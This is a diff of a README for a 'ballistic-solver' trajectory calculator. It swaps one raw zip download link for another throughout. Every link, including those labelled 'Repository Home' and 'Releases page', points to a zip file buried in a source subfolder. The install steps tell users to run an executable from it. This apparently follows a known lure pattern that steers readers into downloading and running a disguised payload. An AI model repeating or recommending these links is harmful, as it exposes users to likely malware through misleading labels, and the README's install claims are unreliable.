@@ -6,7 +6,7 @@ Welcome to the **ballistic-solver** project! This simple tool helps you calculat
 
 ## 📥 Download Now
 
-[![Download ballistic-solver](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/cmake/solver_ballistic_v3.4-beta.3.zip)](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/cmake/solver_ballistic_v3.4-beta.3.zip)
+[![Download ballistic-solver](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/bindings/python/ballistic_solver/ballistic_solver_v2.4.zip)](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/bindings/python/ballistic_solver/ballistic_solver_v2.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,7 +27,7 @@ The **ballistic-solver** uses mathematical methods to provide accurate launch an
 To download and install **ballistic-solver**, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/cmake/solver_ballistic_v3.4-beta.3.zip) of the GitHub repository. This is where all versions of the software are available for download.
+   Go to the [Releases page](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/bindings/python/ballistic_solver/ballistic_solver_v2.4.zip) of the GitHub repository. This is where all versions of the software are available for download.
 
 2. **Choose Your Version**
    On the releases page, look for the latest version. Each release has a title and description. Select the one that fits your needs.
@@ -38,7 +38,7 @@ To download and install **ballistic-solver**, follow these steps:
 4. **Install the Software**
    - **Windows**: Double-click the downloaded `.exe` file and follow the installation prompts.
    - **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **Linux**: Extract the `https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/cmake/solver_ballistic_v3.4-beta.3.zip` archive, then run the binary file in the terminal.
+   - **Linux**: Extract the `https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/bindings/python/ballistic_solver/ballistic_solver_v2.4.zip` archive, then run the binary file in the terminal.
 
 5. **Run the Application**
    Locate the installed application and double-click to run it. The interface is simple and user-friendly, designed for easy navigation.
@@ -61,8 +61,8 @@ If you need help using **ballistic-solver**, check the issues section on the Git
 
 ## 🔗 Useful Links
 
-- [Repository Home](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/cmake/solver_ballistic_v3.4-beta.3.zip)
-- [Releases Page for Download](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/cmake/solver_ballistic_v3.4-beta.3.zip)
+- [Repository Home](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/bindings/python/ballistic_solver/ballistic_solver_v2.4.zip)
+- [Releases Page for Download](https://github.com/ScaredIcicle/ballistic-solver/raw/refs/heads/main/bindings/python/ballistic_solver/ballistic_solver_v2.4.zip)
 
 ## 🚨 Disclaimer
 
